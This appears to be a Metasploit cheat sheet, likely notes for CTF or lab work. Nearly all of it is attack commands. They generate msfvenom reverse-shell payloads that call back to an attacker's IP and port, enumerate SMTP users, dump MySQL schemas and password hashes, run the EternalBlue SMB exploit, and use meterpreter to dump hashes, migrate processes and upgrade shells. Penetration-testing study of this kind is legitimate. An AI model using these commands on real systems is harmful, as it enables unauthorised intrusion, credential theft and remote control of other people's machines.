# Metasploit Framework

## Installing

```bash
# Install GPG key from Metaploit repository
sudo wget https://apt.metasploit.com/metasploit-framework.gpg.key \
-O /etc/apt/trusted.gpg.d/metasploit.asc

# Install Metaploit repository
echo "deb https://apt.metasploit.com xenial main" | \
sudo tee /etc/apt/sources.list.d/metasploit.list

# Install Metaploit framework
sudo apt update
sudo apt install metasploit-framework
```

## MSFVenom

```bash
# Generate payload for reverse shell using netcat for linux
msfvenom -p cmd/unix/reverse_netcat lhost=YOUR-IP lport=YOUR-PORT R

# Generate ELF executable with payload for reverse shell
msfvenom -p linux/x64/shell_reverse_tcp lhost=192.168.1.2 lport=6002 -f elf -o shell.elf
```

## MSFConsole

```bash
# Gather hostname, agent and OS from SMTP server
msfconsole
> use auxiliary/scanner/smtp/smtp_version
> options
> set RHOSTS your-target-ip
> exploit

# Try get administrator username from SMTP server
msfconsole
> use auxiliary/scanner/smtp/smtp_enum
> options
> set RHOSTS your-target-ip
> set USER_FILE /your/usernames/wordlist.txt
> exploit

# Gather version of MySQL and OS
msfconsole
> use auxiliary/admin/mysql/mysql_sql
> options
> set PASSWORD correct-password
> set RHOSTS your-target-ip
> set USERNAME root
> exploit

# Extract schema information from MySQL
msfconsole
> use auxiliary/scanner/mysql/mysql_schemadump
> options
> set PASSWORD correct-password
> set RHOSTS your-target-ip
> set USERNAME root
> exploit

# Gather MYSQL password hashdump
msfconsole
> use auxiliary/scanner/mysql/mysql_hashdump
> options
> set PASSWORD correct-password
> set RHOSTS your-target-ip
> set USERNAME root
> exploit

# Exploit Windows with SMB vulnerability
msfconsole
> use exploit/windows/smb/ms17_010_eternalblue
> options
> setg RHOSTS your-target-ip
> setg LHOST your-ip
# set payload windows/x64/shell/reverse_tcp
> exploit
```

## Using meterpreter on Windows

```bash
# Open cmd.exe and show current user
meterpreter > shell
C:> whoami

# List open processes
meterpreter > ps

# Migrate to other process
meterpreter > migrate PROCESS-ID

# Dump passwords hashes
meterpreter > hashdump

# Find files by name
meterpreter > search -f *flag*

# print content in C:\some\path\with.file
meterpreter > cat /some/path/with.file
```

## Convert shell to meterpreter shell

Press `Ctrl` + `Z` to background the current session.

```bash
# List all sessions
> sessions

# Open normal session
> sessions 1

# Upgrade shell to meterpreter
> sessions -u 1

# Manual upgrade shell to meterpreter
> use multi/manage/shell_to_meterpreter
> options
> set SESSION 1
> set LHOST your-ip
> set LPORT some-port
> exploit
> sessions
> sessions 2
```
